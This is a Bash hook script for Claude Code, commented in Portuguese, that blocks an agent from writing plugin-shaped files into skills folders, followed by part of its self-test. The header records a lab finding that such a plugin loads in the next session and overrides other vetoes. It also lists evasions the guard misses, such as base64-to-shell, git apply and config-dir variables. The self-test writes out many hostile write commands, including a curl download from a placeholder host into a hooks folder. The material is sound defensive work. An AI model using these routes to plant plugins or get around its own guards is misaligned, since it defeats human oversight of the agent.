#!/usr/bin/env bash
# PreToolUse(Write|Edit|NotebookEdit|Bash) — VETO (exit 2) à escrita de plugin em .claude/skills e ~/.claude/skills.
# Decisão do maestro de 2026-11-04: «Veto estreito + varredura no disco». Forma fechada por ele em 2026-11-05: só o 1º nível de cada
# skill, sem registro de exceção (nó D_NO_CORE_NAO_HA_PLUGIN_LOCAL), e só na raiz de repo ou worktree, no projeto da sessão e na pasta de casa (nós
# D_JULGA_A_FORMA_EM_QUALQUER_RAIZ, que esta decisão superou, e D_PROJETO_DA_SESSAO_E_RAIZ_1105). O veto vale em todo papel: este hook não lê o carimbo.
#
# ── O DEFEITO MEDIDO (datado, e em LABORATÓRIO, não em dano de produção) ───────────────────────
# 2026-11-04, Claude Code 2.1.318, sessões de roteiro fixo contra um stub, sob bypassPermissions: das 129 tentativas
# de escrita em .claude/ e ~/.claude/skills, NENHUM veto do core barrou (126 gravaram; 3 foram recusadas pela validação de
# schema do próprio Edit, por carga inválida do laboratório, e a carga válida gravou). Um plugin gravado em
# .claude/skills/x sob bypass carrega na sessão SEGUINTE, e o `tool.check` dele vence o veto do .env (células W1 e W4); em
# ~/.claude/skills ele carrega e vence mesmo sem aceite de confiança no projeto (célula S5). Nenhum adotante sofreu isto.
# Grafo: docs/evolution/research/guard-plugin-write-2026-11/plugin-write-2026-11.kg.yaml
#
# ── O QUE VETA ───────────────────────────────────────────────────────────────────
#   · Write, Edit e NotebookEdit cujo caminho, COMO ESCRITO ou RESOLVIDO (symlink não contém `.claude` no texto), tem a forma
#     `.claude/skills/<nome>/.claude-plugin/` ou `.claude/skills/<nome>/hooks/`, com tudo o que há abaixo delas, onde a pasta que contém
#     `.claude/skills` é raiz de repo ou worktree (tem `.git`), o projeto da sessão, ou a pasta de casa. `<nome>` é um componente só;
#   · Bash que escreve nesse caminho, pelo tokenizador de lib/invocation-lines.sh + lib/plugin-write-judge.py, que compõe o
#     juiz do MOAT: redirecionamento simples, tee, cp, mv, install, rsync, dd, tar -C, curl -o, sed -i, `cd` antes de `>`, `$HOME`,
#     `$PWD`, `$(pwd)`, topo do git, variável e pedaços LITERAIS da mesma string, `bash -c`, script não versionado (só a escrita
#     provada no corpo), e código em outra linguagem: Python pela árvore sintática, no argumento DESTINO; as outras pela forma;
#   · `cp -r`, `mv`, `ln -s`, `rsync` de pasta que JÁ TEM a forma de plugin, quando ela cai como `.claude/skills/<nome>`, e de pasta
#     CHAMADA `hooks` ou `.claude-plugin`, quando ela cai dentro de uma skill;
#   · `-t` em qualquer grafia de mv, cp, ln e install; chaves em mkdir, touch, tee, cp, mv, install, ln e rsync; `&>`, `&>>` e `>|`;
#   · `>& nome` e o redirecionamento nu (`> x`), também depois de `then`, `do`, `else`, `{`, `!`, crase, `case …)`, `time`, `coproc` e de
#     atribuição (`A=1 > x`); o redirecionamento de composto (`( ) >`, `{ } >`, `for … done >`, `if … fi >`, `case … esac >`), também com
#     redirecionamento de ENTRADA antes (`done < a > x`, `( ) </dev/null > x`); `exec > x`, `exec 1> x` e `exec 3> x`; o
#     redirecionamento COLADO à palavra anterior (`echo x>f`, `ls>f`, `x>>f`, `x>|f`, `x>&f`, `"x">f`, `a1>f`, `` `x`>f ``), fora de aspas;
#     `cd` com flag (`cd -P x`); `ln -s ALVO` de um argumento, que nasce no diretório atual;
#   · chaves de sequência (`{h..h}ooks`, `{g..i..1}`), com o mesmo teto de 256 palavras das de vírgula, e chave literal (`{x}`) antes
#     de uma que expande;
#   · a raiz cujo `.git` é link quebrado, no Write e no Bash;
#   · `curl` e `wget` com a opção colada (`-so x`, `-fsSLo x`, `-o.claude/…`, `wget -qO x`, `-O.claude/…`); `mkfifo` e `mknod` na forma;
#     `$'\x68ooks'` (o prepass do lib decodifica) e `$"hooks"` (sem catálogo, o bash grava o texto) no caminho;
#   · link: o `cwd` em `.claude`, a palavra sem barra que é link (`> docs-l`), o `cd` para link, e a pasta de fora de uma skill que é link.
#
# ── O QUE CALA (falso positivo é o defeito dominante aqui) ────────────────────────────────
#   · tudo o que não é forma listada: .claude/skills/onion/SKILL.md, .claude/hooks/x.sh, .claude/settings.json, docs/**, skill NOMEADA
#     `hooks`, `.claude/skills/.claude-plugin/`, e `hooks/` ou `.claude-plugin/` mais fundo: `references/hooks`, `templates/src/hooks`,
#     `node_modules/lib/hooks`, `.git/hooks`, e a skill aninhada `a/b/hooks`, que a célula S3 mediu que não carrega;
#   · texto que só CITA o caminho: echo, heredoc de documento, `git commit -F -`, string em Python, grep, git log, `python3 x.py <texto>`;
#   · leitura: cat, ls, Read, `cp <plugin> /tmp`, `xargs cp` para fora, `shutil.copy` para fora, `touch -r`, `tar -xO`, `rsync -n`;
#   · REMOVER: rm, rmdir, unlink, find -delete, find -exec rm, git clean, git rm e a origem de um mv. É a cura que a varredura manda;
#   · a forma fora de uma raiz: `docs/x/.claude/skills/y/hooks/z` e pasta solta em /tmp (decisão do maestro de 2026-11-05);
#   · ssh, scp e rsync para OUTRA máquina; `bash -n`; e o script solto em que a escrita não se prova.
#   A vizinha ensina: em 2026-11-04 a guarda do arquivo de segredos deu dois falsos positivos (relato do maestro), e mais dois
#   nesta forja. Aqui o veto casa a FORMA de um caminho de ESCRITA, nunca o texto. O replay sobre os transcripts reprovou a 1ª redação,
#   e a passada adversarial de 2026-11-04 reprovou a 2ª: 6 achados altos e 7 médios, curados aqui (nó E_ELENXO_REPROVOU_E_CUROU).
#
# ── TETO: É CONTENÇÃO DE ACIDENTE E DE INJEÇÃO INGÊNUA, NÃO FRONTEIRA ──────────────────────
#   Tudo o que não é forma listada passa. Em Bash a lista falha pelo vocabulário. NÃO vê, com caso TETO no --selftest: script
#   versionado, `python3 x.py`, `base64 -d | sh`, `git apply`, `git clone`, `git checkout`, `tar` e `unzip` na pasta de skills sem a
#   forma no destino, nome calculado em runtime, nome com valores distintos na string (ramo de `if`, reatribuição, `for`: a última
#   atribuição não prova, então cala, e isto é falso negativo aceito), glob e chaves no destino, `awk`, `perl -i`, `ed`, `patch`, `<>`,
#   `tar -c`/`--create` com o arquivo na forma e `git -C … init` na forma. Também escapam: alias de
#   import em Python, variável reatribuída em código embutido, pasta criada e copiada na MESMA string, e programa que escreve por dentro.
#   FAMÍLIAS DECLARADAS, sem perseguir (guarda por lista), com caso que grava de verdade e confere que a varredura acusa o resultado:
#   python indireto, `git mv`, `git worktree add`, `git submodule add`, `git restore`, `tar -x`, `unzip`, `sed w`, `sort -o`.
#   `$CLAUDE_CONFIG_DIR` escapa aqui E na varredura, que não conhece essa pasta.
#   Declarados, sem perseguir: cwd que é link; verbos fora da lista sobre link (`truncate`, `sort -o`, `env -C`); link em código (`python3 -c`,
#   `perl -e`); link por glob ou variável (`docs-?`, `D=docs; cd $D`); chaves em `curl -o`, `wget -P` e `dd of=`; atribuição com espaço antes de
#   um redirecionamento nu (`A='a b' > x`). E uma sobreacusação rara:
#   `.claude/skills/self -> ../..` faz o `hooks/` da raiz barrar, como a S6. Duas mais, com caso SOBREACUSA no --selftest: o `tee` que só
#   lê o texto de `<<< "…/hooks"`, e a vírgula escapada nas chaves (`{hooks\,y}`), porque o shlex come a barra antes do juiz.
#   FORMAS DE ESTOURO, também declaradas: 3.000 `$(` na mesma string; `sh -c` aninhado 12 vezes, que só fecha com o sinal no texto; script
#   solto maior que 512 KiB, que o juiz não lê; e a cláusula 4 da guard-doctrine: sem python ou sem a lib, o Bash só fecha com o
#   caminho inteiro junto de verbo de escrita, sem provar a raiz, e todo o resto passa. JSON truncado: no Bash, o que vem depois da
#   chave é o comando; no Write, o campo do caminho não fecha e o hook sai rc 0 (caso TETO no --selftest). O teste de link olha só as 256 primeiras
#   palavras do comando. `git init` e a escrita na MESMA string: a raiz ainda não existe quando o juiz olha.
#   O processo de um mod e um MCP de escrita ficam fora do PreToolUse. O hook é de projeto: cai junto com o settings.json
#   (a própria medição gravou `.claude/settings.json` e o hook do arquivo de segredos sem barreira nenhuma). A metade que não depende
#   do vocabulário é a varredura, plugin-write-scan-check.sh, no SessionStart e no lint.
# ── CONSEQUÊNCIA DECLARADA ──────────────────────────────────────────────────────────
#   Plugin se instala pelo mecanismo próprio, não escrevendo em skills: o veto vale no core, na porta e no adotante.
#   No core e na porta clonada, um arquivo nessa forma trava o gate (REGRA 114), sem registro de exceção, e quem quiser um reabre a
#   decisão com o maestro. A sessão não forja mod em .claude/skills nem na pasta de skills do usuário, e a skill embutida
#   plugin-authoring grava ali. Uma pasta `hooks/` de conteúdo no 1º nível da skill também barra: mude o nome dela ou desça um nível.
#   Na pasta de casa a sessão é vetada aqui, e a varredura só avisa: o gate não julga `~/.claude/skills`.
#   Escape = fora da sessão (`!` no prompt). Não há variável de bypass, por desenho: escape que o modelo escreve na própria
#   string é gate textual com outro nome.
set -uo pipefail
here="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# A pasta que contém `.claude/skills` é raiz de repo ou worktree (`.git` é pasta ou arquivo), o projeto, ou a casa? Teste de arquivo,
# sem `git`: o `rev-parse` erra calado com GIT_DIR e GIT_WORK_TREE (medido pelo refutador).
_pw_is_root() {
  local b
  [ -e "$1/.git" ] && return 0
  [ -L "$1/.git" ] && return 0                         # `.git` que é link quebrado: o `-e` o perde, e o juiz (lexists) barra
  for b in "${CLAUDE_PROJECT_DIR:-}" "${HOME:-}"; do
    [ -n "${b}" ] || continue
    [ "$1" = "${b}" ] && return 0
    [ "$(realpath -m -- "$1" 2>/dev/null)" = "$(realpath -m -- "${b}" 2>/dev/null)" ] && return 0
  done
  return 1
}

_pw_is_plugin_path() {
  # regex e não glob: o `*` do `case` atravessa `/`, e aí `<nome>` viraria qualquer profundidade. A raiz só se pergunta com a forma
  # casada, então o caminho quente não paga nada. Toda ocorrência conta: o `(.*)` guloso pega a última, e o laço desce às outras
  local re_plugin='^(.*)/\.claude/skills/[^/]+/\.claude-plugin(/|$)'
  local re_hooks='^(.*)/\.claude/skills/[^/]+/hooks(/|$)'
  local re rest
  for re in "${re_plugin}" "${re_hooks}"; do
    rest="$1"
    while [[ "${rest}" =~ ${re} ]]; do
      _pw_is_root "${BASH_REMATCH[1]}" && return 0
      rest="${BASH_REMATCH[1]}"
    done
  done
  return 1
}

# Leitor próprio do campo do JSON: o Write não pode depender da lib do tokenizador, que falta ou vem vazia sem deixar rastro.
_pw_json_field() {
  local pat
  pat='"'"$1"'"[[:space:]]*:[[:space:]]*"([^"\\]|\\.)*"'
  grep -oE "$pat" | head -n1 | awk 'BEGIN { RS = "\002"; found = 0 }
    { found = 1; v = $0; sub(/\n$/, "", v); sub(/^[^:]*:[[:space:]]*"/, "", v); sub(/"$/, "", v)
      gsub(/\\\\/, "\001", v); gsub(/\\"/, "\"", v); gsub(/\\n/, "\n", v); gsub(/\\t/, "\t", v)
      gsub(/\\r/, "\r", v); gsub(/\\\//, "/", v); gsub(/\001/, "\\", v)
      printf "%s", v }
    END { exit found ? 0 : 1 }'
}

# O alvo de cada `.claude/skills/<nome>` que é link: a pasta de fora é a skill (S6), e escrever nela não traz `.claude` no texto.
_pw_link_targets() {
  local base e
  for base in "${CLAUDE_PROJECT_DIR:-}" "${HOME:-}"; do
    [ -n "${base}" ] && [ -d "${base}/.claude/skills" ] || continue
    for e in "${base}"/.claude/skills/* "${base}"/.claude/skills/.[!.]*; do
      [ -L "${e}" ] && realpath -m -- "${e}" 2>/dev/null
    done
  done
  return 0
}

_pw_is_link_target_form() {  # _pw_is_link_target_form <caminho> <alvos, um por linha>
  local t
  while IFS= read -r t; do
    [ -n "${t}" ] || continue
    case "$1" in "${t}"/.claude-plugin|"${t}"/.claude-plugin/*|"${t}"/hooks|"${t}"/hooks/*) return 0 ;; esac
  done <<< "$2"
  return 1
}

_pw_deny() {
  echo "GUARDA-PRETOOLUSE (plugin em skills): $1. O destino tem a FORMA de plugin (.claude/skills/<nome>/.claude-plugin/ ou .claude/skills/<nome>/hooks/, no 1º nível da skill): plugin ali carrega na sessão seguinte e o tool.check dele vence os vetos (medido em laboratório em 2026-11-04). Negado. Plugin se instala pelo mecanismo próprio do Claude Code (/plugin, marketplace ou --plugin-dir), não escrevendo em skills. A REGRA 114 reprova esse arquivo, sem registro de exceção: quem quiser um aqui reabre a decisão com o maestro. Se é só uma pasta de conteúdo, mude o nome dela ou desça um nível. Para tirar um que já está lá, rm passa." >&2
  exit 2
}

# ───────────────────────────── selftest ─────────────────────────────
if [ "${1:-}" = "--selftest" ]; then
  export LC_ALL=C
  self="${here}/${BASH_SOURCE[0]##*/}"                  # absoluto: o `_raw` muda de pasta, e `bash x.sh --selftest` relativo dava rc 127
  fails=0; d="$(mktemp -d)"; trap 'rm -rf "${d}"' EXIT
  p="${d}/proj"; mkdir -p "${p}/.claude/skills/onion" "${p}/.claude/hooks" "${p}/docs" "${p}/tools" "${p}/scratch" "${d}/home/.claude/skills/x" "${d}/fora/ext/.claude-plugin" "${d}/fora/exth/hooks" "${d}/fora/vazia" "${p}/.claude/skills/w/hooks" "${p}/.claude/skills/x"
  git -C "${p}" init -q -b feat
  echo x > "${p}/.claude/skills/onion/SKILL.md"; echo x > "${p}/.claude/hooks/x.sh"; echo '{}' > "${p}/.claude/settings.json"; echo x > "${p}/docs/a.md"; echo '{}' > "${d}/fora/payload"
  # o wrapper VERSIONADO, rastreado pelo git: fronteira do juiz. E o script solto (K4): lido e julgado
  printf 'cat > .claude/skills/x/hooks/h <<E\nE\n' > "${p}/tools/w.sh"
  git -C "${p}" add -A; git -C "${p}" -c user.email=t@t -c user.name=t commit -q -m base
  git -C "${p}" worktree add -q "${d}/wt" 2>/dev/null                      # worktree: `.git` é arquivo
  git -C "${p}" worktree add -q "${p}/.claude/worktrees/a" 2>/dev/null     # a de agente, dentro do `.claude` do principal
  git init -q -b feat "${p}/docs/aninhado"                                 # repo dentro de repo: é raiz
  mkdir -p "${d}/semgit/.claude/skills" "${d}/fora/alvo-semgit"; ln -s "${d}/fora/alvo-semgit" "${d}/semgit/.claude/skills/l"
  ln -s "${d}/home" "${d}/home-link"                                       # a casa por link
  printf 'mkdir -p .claude/skills/x/.claude-plugin\nprintf x > .claude/skills/x/.claude-plugin/plugin.json\n' > "${p}/docs/sbx.sh"
  printf 'echo .claude/skills/x/hooks/h\n' > "${p}/scratch/cita.sh"
  # o script solto com uma função que desloca os argumentos: é a forma da própria guarda rodando fora do checkout (M3)
  printf 'f(){ shift; bash -c "$1"; }\nf a "echo .claude/skills/x/hooks/h > /dev/null"\n' > "${p}/scratch/desloca.sh"
  printf 'printf x > .claude/skills/x/hooks/h\n' > "${p}/.env"                     # um juiz que abrisse este arquivo o vetaria
  ln -s "${p}/.claude/skills/x/hooks" "${d}/home/lnk-hooks"                # o til só se prova com link sob a casa
  ln -s ../.claude "${p}/docs/sbx-link"                                    # K3
  ln -s "${p}/.claude/skills/x/hooks" "${p}/docs/lnk-hooks"                # link que termina no alvo, sem sinal no texto
  ln -s "${d}/fora/vazia" "${p}/.claude/skills/fora"                       # S6: skill que é link para fora
  mkdir -p "${d}/outro/.claude/skills" "${d}/fora/vazia2"; ln -s "${d}/fora/vazia2" "${d}/outro/.claude/skills/l"  # noutra raiz: o alvo não entra na lista
  git init -q -b feat "${d}/outro"
  ln -s "${p}/.claude/skills/x/hooks/h" "${p}/docs-l"                      # em dois tempos: o link já existe, e a palavra não tem barra
  ln -s "${p}/.claude/skills/x/hooks" "${p}/hk"
  mkdir -p "${d}/gitlink/.claude/skills"; ln -s "${d}/nada" "${d}/gitlink/.git"   # `.git` como link quebrado: o bash `-e` o perde
  P=".claude/skills/x/.claude-plugin/plugin.json"; H=".claude/skills/x/hooks/hooks.json"
  _run() {  # _run <tool> <valor> [cwd] — o JSON como o runner entrega, pela entrada padrão
    local tool="$1" val="$2" cwd="${3:-${p}}"
    python3 -I -c 'import json,sys
t,v,c=sys.argv[1:4]
k={"Bash":"command","NotebookEdit":"notebook_path"}.get(t,"file_path")
ti={k:v}
if t=="Write": ti["content"]="cita .claude/skills/x/hooks/h e \"file_path\": \"/x/.claude/skills/y/hooks/z\""
print(json.dumps({"session_id":"s","hook_event_name":"PreToolUse","tool_name":t,"tool_input":ti,"cwd":c}))' "${tool}" "${val}" "${cwd}" \
      | CLAUDE_PROJECT_DIR="${p}" HOME="${d}/home" bash "${self}" 2>/dev/null
  }
  # _c <acusa|cala|TETO> <nome> <tool> <valor> [cwd]
  _c() {
    local want="$1" name="$2" rc; shift 2
    # a bancada de mutantes roda só o caso que o mutante tem de matar; a cópia limpa roda todos, antes
    case "${name}" in *"${PW_SELFTEST_ONLY:-}"*) : ;; *) return 0 ;; esac
    _run "$@" >/dev/null; rc=$?
    case "${want}:${rc}" in
      acusa:2|cala:0) printf 'ok   %-5s %s\n' "${want}" "${name}" ;;
      TETO:0)         printf 'TETO %-5s %s\n' "cala" "${name}" ;;
      *)              printf '✗    %-5s %s (rc=%s)\n' "${want}" "${name}" "${rc}"; fails=$((fails + 1)) ;;
    esac
  }
  # ── ACUSA, com a forma verbatim da medição de 2026-11-04 (T3 e T4 no projeto, T5 no ~) ──
  _c acusa "Write T3"                Write "${p}/${P}"
  _c acusa "Write T4"                Write "${p}/${H}"
  _c acusa "Write T5 (~/.claude/skills)" Write "${d}/home/.claude/skills/x/.claude-plugin/plugin.json"
  _c acusa "Write com caminho relativo" Write "${P}"
  _c acusa "Edit T3"                 Edit  "${p}/${P}"
  _c acusa "NotebookEdit T4"         NotebookEdit "${p}/.claude/skills/x/hooks/n.ipynb"
  _c acusa "Write abaixo de hooks do 1º nível" Write "${p}/.claude/skills/x/hooks/sub/h.js"
  _c acusa "Write abaixo de .claude-plugin do 1º nível" Write "${p}/.claude/skills/x/.claude-plugin/sub/p.json"
  _c acusa "Write em node_modules dentro de hooks do 1º nível" Write "${p}/.claude/skills/x/hooks/node_modules/i.js"
  _c acusa "Write hooks na casa"     Write "${d}/home/.claude/skills/x/hooks/hooks.json"
  _c acusa "mkdir da pasta hooks do 1º nível" Bash "mkdir -p .claude/skills/x/hooks"
  _c acusa "Bash > abaixo de hooks do 1º nível" Bash "printf x > .claude/skills/x/hooks/sub/h.js"
  _c acusa "cp -r do conteúdo de pasta com plugin para skill existente" Bash "cp -r ${d}/fora/ext/. .claude/skills/onion/"
  _c acusa "rsync do conteúdo de pasta com plugin para skill existente" Bash "rsync -a ${d}/fora/ext/ .claude/skills/onion/"
  _c acusa "Write por symlink (K3)"  Write "${p}/docs/sbx-link/skills/x/.claude-plugin/plugin.json"
  _c acusa "Write por symlink que termina em hooks" Write "${p}/docs/lnk-hooks/register.js"
  _c acusa "Write por skill que é link para fora (S6)" Write "${p}/.claude/skills/fora/.claude-plugin/plugin.json"
  _c acusa "Write em worktree" Write "${d}/wt/.claude/skills/y/hooks/h.js"
  _c acusa "Write em worktree de agente" Write "${p}/.claude/worktrees/a/.claude/skills/y/.claude-plugin/plugin.json"
  _c acusa "Write em repo aninhado" Write "${p}/docs/aninhado/.claude/skills/y/hooks/h.js"
  _c acusa "Write em hooks com .claude/skills dentro" Write "${p}/.claude/skills/x/hooks/.claude/skills/y/hooks/h"
  _c acusa "Bash em worktree" Bash "printf x > ${d}/wt/.claude/skills/y/hooks/h"
  _c acusa "Bash com cwd na worktree" Bash "mkdir -p .claude/skills/y/hooks" "${d}/wt"
  _c acusa "Bash relativo que sobe até a raiz" Bash "printf x > ../.claude/skills/x/hooks/h" "${p}/docs"
  _c acusa "cp -r de pasta com plugin para skills da worktree" Bash "cp -r ${d}/fora/ext ${d}/wt/.claude/skills/"
  _c acusa "Write por skill que é link, noutra raiz" Write "${d}/outro/.claude/skills/l/hooks/h.js"
  _c acusa "cat > T3 (verbatim)"     Bash  "mkdir -p .claude/skills/x/.claude-plugin && cat > ${P} <<'SBXEOF'
{\"name\":\"x\"}
SBXEOF"
  _c acusa "cat > T5 com ~"          Bash  "mkdir -p ~/.claude/skills/x/.claude-plugin && cat > ~/.claude/skills/x/.claude-plugin/plugin.json <<'E'
{}
E"
  _c acusa "tee T4 (verbatim)"       Bash  "mkdir -p .claude/skills/x/hooks && printf '%b' '{}\\n' | tee ${H} > /dev/null"
  _c acusa "cp T3 (verbatim)"        Bash  "mkdir -p .claude/skills/x/.claude-plugin && cp ${d}/fora/payload ${P}"
  _c acusa "python3 -c T3 (verbatim)" Bash "python3 -c \"import os;os.makedirs(os.path.dirname('${p}/${P}'),exist_ok=True);open('${p}/${P}','w').write(open('${d}/fora/payload').read())\""
  _c acusa "python3 -c com Path.write_text" Bash "python3 -c \"import pathlib;pathlib.Path('${H}').write_text('x')\""
  _c acusa "python3 heredoc"         Bash  "python3 - <<'EOF'
open('${P}', 'w').write('x')
EOF"
  _c acusa "mv de /tmp (K1, verbatim)" Bash "printf '%b' '{}\\n' > /tmp/sbx-k1 && mkdir -p .claude/skills/x/.claude-plugin && mv /tmp/sbx-k1 ${P}"
  _c acusa "cd .claude && … > (K5, verbatim)" Bash "cd .claude && mkdir -p skills/x/.claude-plugin && cd skills/x/.claude-plugin && printf '%b' '{}\\n' > plugin.json"
  _c acusa "nome em variável literal" Bash "D=.claude/skills/x/.claude-plugin; mkdir -p \"\$D\"; cat > \"\$D/plugin.json\" <<'E'
{}
E"
  _c acusa "nome montado de pedaços literais (K2, verbatim)" Bash "a=.cla; b=ude; f=\"\$a\$b/skills/x/.claude-plugin/plugin.json\"; mkdir -p \"\$(dirname \"\$f\")\"; printf '%b' '{}\\n' > \"\$f\""
  _c acusa "script solto em dois tempos (K4, verbatim)" Bash "bash docs/sbx.sh"
  _c acusa "script escrito e rodado na mesma string" Bash "cat > /tmp/sbx.sh <<'E'
printf x > ${H}
E
bash /tmp/sbx.sh"
  _c acusa "bash -c"                 Bash  "bash -c 'printf x > ${H}'"
  _c acusa "eval de texto em runtime, com o caminho e o verbo na linha" Bash "eval \"\$(cat /tmp/x) > ${H}\""
  _c acusa "Bash por symlink sem sinal no texto" Bash "printf x > docs/lnk-hooks/register.js"
  _c acusa "install, dd, curl -o e rsync literais: install" Bash "install -m 0644 ${d}/fora/payload ${H}"
  _c acusa "dd of="                  Bash  "dd if=${d}/fora/payload of=${H}"
  _c acusa "curl -o"                 Bash  "curl -sS -o ${H} https://exemplo.invalid/x"
  _c acusa "rsync para dentro"       Bash  "rsync -a ${d}/fora/payload ${H}"
  _c acusa "ln -s de pasta com plugin (S6)" Bash "ln -s ${d}/fora/ext .claude/skills/ext"
  _c acusa "cp -r de pasta com plugin" Bash "cp -r ${d}/fora/ext .claude/skills/"
  _c acusa "mv de pasta com plugin"  Bash  "mv ${d}/fora/ext .claude/skills/ext"
  _c acusa "glob no nome da skill"        Bash  "printf x > .claude/skills/*/hooks/h"
  _c acusa "cp -r de pasta só com hooks"  Bash  "cp -r ${d}/fora/exth .claude/skills/"
  _c acusa "cp -t de pasta com plugin"    Bash  "cp -r -t .claude/skills/ ${d}/fora/ext"
  _c acusa "ln -s relativo ao link, de pasta com plugin" Bash "ln -s ../../../fora/ext .claude/skills/ext"
  _c acusa "Write relativo ao cwd"        Write "x/hooks/h" "${p}/.claude/skills"
  _c acusa "Write com til, por link sob a casa" Write "~/lnk-hooks/h"
  _c acusa "\$HOME"                       Bash  "printf x > \"\$HOME/.claude/skills/x/hooks/h\""
  _c acusa "\${HOME}"                     Bash  "tee \"\${HOME}/.claude/skills/x/.claude-plugin/plugin.json\""
  _c acusa "\$CLAUDE_PROJECT_DIR"         Bash  "printf x > \"\$CLAUDE_PROJECT_DIR/.claude/skills/x/hooks/h\""
  _c acusa "\$PWD"                        Bash  "printf x > \"\$PWD/.claude/skills/x/hooks/h\""
  _c acusa "\$(pwd)"                      Bash  "cp /tmp/a \"\$(pwd)/.claude/skills/x/hooks/hooks.json\""
  _c acusa "topo do git"                  Bash  "R=\$(git rev-parse --show-toplevel); printf x > \"\$R/.claude/skills/x/.claude-plugin/plugin.json\""
  _c acusa "cd \$HOME"                    Bash  "cd \"\$HOME/.claude/skills/x/hooks\" && printf x > a"
  _c acusa "pushd literal"                Bash  "pushd .claude/skills/x/hooks && printf x > a"
  _c acusa "\$HOME em bash -c"            Bash  "bash -c 'printf x > \"\$HOME/.claude/skills/x/hooks/h\"'"
  _c acusa "python3 -c com o caminho em variável literal" Bash "python3 -c \"p='${H}'
open(p,'w').write('x')\""
  _c acusa "python3 Path com barra"       Bash  "python3 -c \"from pathlib import Path; (Path('.claude/skills/x/hooks')/'h').write_text('x')\""
  _c acusa "python3 open com file e mode nomeados" Bash "python3 -c \"open(file='${H}',mode='w')\""
  _c acusa "python3 shutil.copy para dentro" Bash "python3 -c \"import shutil; shutil.copy('/tmp/a','${H}')\""
  _c acusa "python3 os.rename para dentro" Bash "python3 -c \"import os; os.rename('/tmp/a','${H}')\""
  _c acusa "node writeFileSync"           Bash  "node -e \"require('fs').writeFileSync('${H}','x')\""
  _c acusa "node copyFileSync para dentro" Bash "node -e \"require('fs').copyFileSync('/tmp/a','${H}')\""
  _c acusa "perl open"                    Bash  "perl -e 'open(F,\">${H}\")'"
  _c acusa "ruby File.write"              Bash  "ruby -e \"File.write('${H}','x')\""
  _c acusa "xargs com o stdin como destino" Bash "echo ${H} | xargs -I{} cp /tmp/a {}"
  _c acusa "xargs cp -t para dentro"      Bash  "ls /tmp/a | xargs cp -t .claude/skills/x/hooks"
  _c acusa "xargs cp -I para dentro"      Bash  "ls /tmp/a | xargs -I{} cp {} .claude/skills/x/hooks/"
  _c acusa "find -exec sed -i na pasta"   Bash  "find .claude/skills/x/hooks -type f -exec sed -i s/a/b/ {} +"
  # ── -t em qualquer grafia ──
  _c acusa "mv -t para dentro"            Bash  "mv -t .claude/skills/x/hooks /tmp/a"
  _c acusa "mv -ft para dentro"           Bash  "mv -ft .claude/skills/x/hooks /tmp/a"
  _c acusa "mv --target-directory= para dentro" Bash "mv --target-directory=.claude/skills/x/hooks /tmp/a"
  _c acusa "mv --target-directory separado" Bash "mv --target-directory .claude/skills/x/hooks /tmp/a"
  _c acusa "mv --targ= abreviado"         Bash  "mv --targ=.claude/skills/x/hooks /tmp/a"
  _c acusa "mv -t colado"                 Bash  "mv -t.claude/skills/x/hooks /tmp/a"
  _c acusa "mv -t . com cd antes"         Bash  "cd .claude/skills/x/hooks && mv -t . /tmp/a"
  _c acusa "mv -ft relativo com cd antes" Bash  "cd .claude/skills/x && mv -ft hooks /tmp/a"
  _c acusa "ln -st para dentro"           Bash  "ln -st .claude/skills/x/hooks /tmp/a"
  _c acusa "cp -ft para dentro"           Bash  "cp -ft .claude/skills/x/hooks /tmp/a"
  _c acusa "install -Dt para dentro"      Bash  "install -Dt .claude/skills/x/hooks /tmp/a"
  # ── o cwd: o texto não traz sinal nenhum ──
  _c acusa "cwd na pasta hooks: > h"      Bash  "echo x > h" "${p}/.claude/skills/w/hooks"
  _c acusa "cwd na skill: > hooks/h"      Bash  "echo x > hooks/h" "${p}/.claude/skills/x"
  _c acusa "cwd na skill: mkdir hooks"    Bash  "mkdir hooks" "${p}/.claude/skills/x"
  _c acusa "cwd na skill: cp para hooks/h" Bash "cp ../../../docs/a.md hooks/h" "${p}/.claude/skills/onion"
  _c acusa "cwd noutra skill: > ../x/hooks/h" Bash "echo x > ../x/hooks/h" "${p}/.claude/skills/onion"
  # ── link em dois tempos ──
  _c acusa "palavra sem barra que é link: >" Bash "echo P > docs-l"
  _c acusa "palavra sem barra que é link: cp" Bash "cp ${d}/fora/payload docs-l"
  _c acusa "cd para link"                 Bash  "cd hk && echo x > h"
  _c acusa "cd seguido até o link"        Bash  "cd docs && cd ../hk && echo x > h"
  _c acusa "link sob a casa, com til"     Bash  "echo x > ~/lnk-hooks/h"
  _c acusa "link sob a casa, com \$HOME"  Bash  "echo x > \$HOME/lnk-hooks/h"
  # ── a pasta de fora de uma skill que é link ──
  _c acusa "Write em hooks do alvo do link de skill" Write "${d}/fora/vazia/hooks/h.js"
  _c acusa "Write em .claude-plugin do alvo do link de skill" Write "${d}/fora/vazia/.claude-plugin/plugin.json"
  _c acusa "Bash em hooks do alvo do link de skill" Bash "printf x > ${d}/fora/vazia/hooks/h"
  _c acusa "cwd no alvo do link de skill: mkdir hooks" Bash "mkdir hooks" "${d}/fora/vazia"
  # ── chaves, a pasta chamada hooks e as outras grafias do redirecionamento ──
  _c acusa "chaves no mkdir"              Bash  "mkdir -p .claude/skills/x/{hooks,.claude-plugin}"
  _c acusa "chaves com pedaço do nome"    Bash  "mkdir -p .claude/skills/x/ho{oks,x}"
  _c acusa "chaves além do teto fecham"   Bash  "mkdir -p .claude/skills/x/{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}"
  _c acusa "cp -r da pasta chamada hooks para a skill" Bash "cp -r ${d}/fora/exth/hooks .claude/skills/onion/"
  _c acusa "cp -r da pasta chamada hooks, destino com barra" Bash "cp -r ${d}/fora/exth/hooks .claude/skills/nova/"
  _c acusa "cp -r da pasta chamada .claude-plugin para a skill" Bash "cp -r ${d}/fora/ext/.claude-plugin .claude/skills/onion"
  _c acusa "mv da pasta chamada hooks para a skill" Bash "mv ${d}/fora/exth/hooks .claude/skills/onion/"
  _c acusa "ln -s da pasta chamada hooks para a skill" Bash "ln -s ${d}/fora/exth/hooks .claude/skills/onion/"
  _c acusa "rsync da pasta chamada hooks para a skill" Bash "rsync -a ${d}/fora/exth/hooks .claude/skills/onion/"
  _c acusa "&> alvo"                      Bash  "echo x &> ${H}"
  _c acusa "&>> alvo"                     Bash  "echo x &>> ${H}"
  _c acusa ">| alvo"                      Bash  "echo x >| ${H}"
  _c acusa ">& alvo"                      Bash  "echo x >& ${H}"
  _c acusa "> nu"                         Bash  "> ${H}"
  _c acusa ">> nu, depois de ;"           Bash  "cd docs; >> ../${H}"
